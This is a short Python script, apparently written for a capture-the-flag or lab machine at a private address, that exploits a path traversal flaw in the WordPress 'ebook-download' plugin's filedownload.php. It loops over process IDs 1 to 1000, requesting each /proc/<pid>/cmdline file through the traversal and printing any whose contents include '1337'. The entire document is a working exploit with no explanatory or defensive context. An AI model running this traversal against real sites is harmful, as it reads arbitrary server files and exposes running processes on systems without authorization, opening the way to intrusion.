import requests
from tqdm import tqdm

base_url = "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/{}/cmdline"
for i in tqdm(range(1, 1001)):
    r = requests.get(base_url.format(i))
    if "1337" in r.text:
        print(r.text)
